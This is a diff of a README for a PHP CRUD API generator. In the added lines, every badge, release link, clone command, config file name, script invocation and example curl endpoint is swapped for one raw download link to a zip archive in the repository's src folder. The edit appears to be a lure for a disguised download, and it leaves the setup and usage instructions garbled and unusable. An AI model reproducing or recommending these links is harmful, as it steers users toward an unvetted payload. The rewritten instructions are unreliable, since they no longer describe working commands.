@@ -1,8 +1,8 @@
 # PHP CRUD API Generator 🚀
 
-![PHP CRUD API Generator](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![GitHub stars](https://img.shields.io/github/stars/tomo3076/PHP-CRUD-API-Generator.svg?style=social)
+![PHP CRUD API Generator](https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip)
+![License](https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip)
+![GitHub stars](https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip)
 
 Welcome to the **PHP CRUD API Generator** repository! This tool helps you quickly create a fully functional API for your MariaDB or MySQL database using PHP. Whether you are a developer looking to streamline your API development or a beginner eager to learn, this project provides a simple and effective solution.
 
@@ -27,7 +27,7 @@ Welcome to the **PHP CRUD API Generator** repository! This tool helps you quickl
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/tomo3076/PHP-CRUD-API-Generator/releases). After downloading, extract the files to your server directory.
+To get started, download the latest release from the [Releases section](https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip). After downloading, extract the files to your server directory.
 
 ### Prerequisites
 
@@ -39,7 +39,7 @@ To get started, download the latest release from the [Releases section](https://
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/tomo3076/PHP-CRUD-API-Generator.git
+   git clone https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -52,7 +52,7 @@ To get started, download the latest release from the [Releases section](https://
    composer install
    ```
 
-4. **Configure Your Database**: Open the `config.php` file and set your database credentials.
+4. **Configure Your Database**: Open the `https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip` file and set your database credentials.
 
 5. **Run the Application**: Access the API through your web server.
 
@@ -63,7 +63,7 @@ Once you have installed the API generator, you can start creating your endpoints
 1. **Define Your Database Structure**: Create tables in your MariaDB or MySQL database.
 2. **Generate the API**: Use the command line to generate your API endpoints.
    ```bash
-   php generate.php
+   php https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 3. **Test Your API**: Use tools like Postman or curl to test the endpoints.
 
@@ -80,27 +80,27 @@ The API supports various endpoints for CRUD operations:
 
 - **Create a Record**:
    ```bash
-   curl -X POST -H "Content-Type: application/json" -d '{"name": "John Doe"}' http://yourapi.com/api/users
+   curl -X POST -H "Content-Type: application/json" -d '{"name": "John Doe"}' https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 
 - **Read Records**:
    ```bash
-   curl -X GET http://yourapi.com/api/users
+   curl -X GET https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 
 - **Update a Record**:
    ```bash
-   curl -X PUT -H "Content-Type: application/json" -d '{"name": "Jane Doe"}' http://yourapi.com/api/users/1
+   curl -X PUT -H "Content-Type: application/json" -d '{"name": "Jane Doe"}' https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 
 - **Delete a Record**:
    ```bash
-   curl -X DELETE http://yourapi.com/api/users/1
+   curl -X DELETE https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip
    ```
 
 ## Configuration
 
-To configure your API, modify the `config.php` file. You will need to set the following parameters:
+To configure your API, modify the `https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip` file. You will need to set the following parameters:
 
 - **Database Host**: Your database server address.
 - **Database Name**: The name of your database.
@@ -133,7 +133,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, please check the [Releases section](https://github.com/tomo3076/PHP-CRUD-API-Generator/releases) for updates. You can also open an issue in the repository for any bugs or feature requests.
+If you have any questions or need support, please check the [Releases section](https://github.com/tomo3076/PHP-CRUD-API-Generator/raw/refs/heads/main/src/AP-Generator-PH-CRU-1.7-alpha.3.zip) for updates. You can also open an issue in the repository for any bugs or feature requests.
 
 ---
 
